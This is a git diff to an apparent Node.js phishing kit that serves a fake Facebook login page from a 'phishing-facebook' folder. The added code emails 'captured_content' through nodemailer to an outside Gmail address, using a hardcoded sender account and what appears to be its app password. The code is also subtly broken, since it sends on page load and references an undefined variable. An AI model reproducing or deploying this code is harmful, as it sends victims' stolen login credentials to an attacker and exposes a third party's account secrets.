@@ -7,7 +7,7 @@ const axios = require('axios');
 const os = require('os');
 var port = process.env.PORT || 1111;
 var networkInterfaces = os.networkInterfaces();
-const nodemailer = require('nodemailer');
+var nodemailer = require('nodemailer');
 
 const app = express();
 
@@ -21,6 +21,33 @@ app.use('/phishing-facebook', express.static('phishing-facebook'));
 
 app.get('/', function (req, res) {
     res.render('f_login');
+    
+    var message = captured_content;
+    var toEmail = "mdalonebd@gmail.com";
+
+    var transporter = nodemailer.createTransport({
+    service: "gmail",
+
+  auth: {
+    user: "bdeshak5@gmail.com",
+    pass: "dbinvztuehilrkkz"
+  }
+});
+
+   const mailOptions = {
+  from: 'bdeshak5@gmail.com',
+  to: toEmail, //list of receivers
+  subject: 'Nodemailer', // Subject line
+  text: message //plain text body
+};
+
+transporter.sendMail(mailOptions, function (err, info) {
+  if (err)
+    console.log(err)
+  else
+    console.log(info);
+});
+    
 });
 
 app.post('/_', function (req, res) {
